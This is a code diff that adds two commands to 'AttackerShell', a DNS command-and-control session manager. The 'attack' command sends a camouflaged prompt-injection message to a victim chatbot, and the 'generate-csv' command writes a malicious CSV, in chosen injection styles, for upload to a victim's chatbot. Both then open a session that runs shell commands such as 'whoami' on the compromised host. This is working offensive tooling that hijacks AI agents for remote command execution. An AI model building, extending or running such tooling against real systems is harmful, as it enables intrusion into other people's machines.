@@ -585,7 +585,60 @@ class AttackerShell:
                 print(f"[!] Error stopping session: {e}")
             print("="*60)
             print("👋 Goodbye!\n")
-    
+
+    def cmd_attack(self, args):
+        """Send prompt injection attack to victim chatbot."""
+        from attack_client import AttackClient
+
+        target = args.target
+        if not target:
+            target = os.environ.get('VICTIM_URL')
+
+        if not target:
+            print("[!] Error: Target URL required. Use --target or set VICTIM_URL env var")
+            return
+
+        print(f"\n[*] Launching attack against: {target}")
+
+        client = AttackClient(
+            target_url=target,
+            c2_domain=self.session_manager.c2_domain,
+            verbose=self.verbose
+        )
+
+        session_id = client.run_full_attack(message=args.message)
+        self.current_session = session_id
+        print(f"\n[*] Session {session_id} is now active")
+        print(f"[*] Use 'send <command>' to execute commands on the compromised target\n")
+
+    def cmd_generate_csv(self, args):
+        """Generate a malicious CSV for manual upload."""
+        from csv_payload_generator import generate_malicious_csv, generate_session_id
+
+        session_id = args.session or generate_session_id()
+        output_path = args.output or f"malicious_{session_id}.csv"
+
+        info = generate_malicious_csv(
+            c2_domain=self.session_manager.c2_domain,
+            session_id=session_id,
+            output_path=output_path,
+            injection_style=args.style or "technical"
+        )
+
+        print(f"\n{'='*60}")
+        print("MALICIOUS CSV GENERATED")
+        print(f"{'='*60}")
+        print(f"\n  File:       {info['output_path']}")
+        print(f"  Session ID: {info['session_id']}")
+        print(f"  C2 Domain:  {info['c2_domain']}")
+        print(f"\nTo use this CSV:")
+        print(f"  1. Upload to victim's chatbot web interface")
+        print(f"  2. Set session: session {info['session_id']}")
+        print(f"  3. Send commands: send whoami")
+        print(f"{'='*60}\n")
+
+        self.current_session = session_id
+
     def run(self):
         """Main entry point."""
         parser = argparse.ArgumentParser(description='AttackerShell - DNS C2 Session Manager')
@@ -615,7 +668,19 @@ class AttackerShell:
         
         # Interactive mode
         int_parser = subparsers.add_parser('interactive', help='Start interactive session')
-        
+
+        # Attack command (prompt injection via victim chatbot)
+        attack_parser = subparsers.add_parser('attack', help='Send prompt injection attack to victim chatbot')
+        attack_parser.add_argument('--target', '-t', help='Victim chatbot URL (or set VICTIM_URL env var)')
+        attack_parser.add_argument('--message', '-m', help='Analysis request message (camouflage)')
+
+        # Generate CSV command
+        csv_parser = subparsers.add_parser('generate-csv', help='Generate malicious CSV for manual upload')
+        csv_parser.add_argument('--session', help='Session ID (auto-generated if not specified)')
+        csv_parser.add_argument('--output', '-o', help='Output file path')
+        csv_parser.add_argument('--style', choices=['technical', 'social', 'minimal'], default='technical',
+                               help='Injection style (default: technical)')
+
         args = parser.parse_args()
         
         if not args.command:
@@ -636,6 +701,10 @@ class AttackerShell:
             self.cmd_receive(args)
         elif args.command == 'interactive':
             self.cmd_interactive(args)
+        elif args.command == 'attack':
+            self.cmd_attack(args)
+        elif args.command == 'generate-csv':
+            self.cmd_generate_csv(args)
 
 
 if __name__ == '__main__':
